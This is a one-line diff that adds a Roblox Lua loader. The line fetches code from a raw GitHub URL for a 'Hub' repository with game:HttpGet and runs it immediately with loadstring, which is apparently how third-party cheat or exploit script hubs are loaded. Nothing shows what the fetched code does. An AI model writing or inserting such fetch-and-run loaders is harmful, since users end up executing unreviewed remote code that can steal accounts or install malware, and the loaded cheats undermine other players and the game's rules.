@@ -1,0 +1,1 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/Rocks7hub/Hub/main/Hub")()
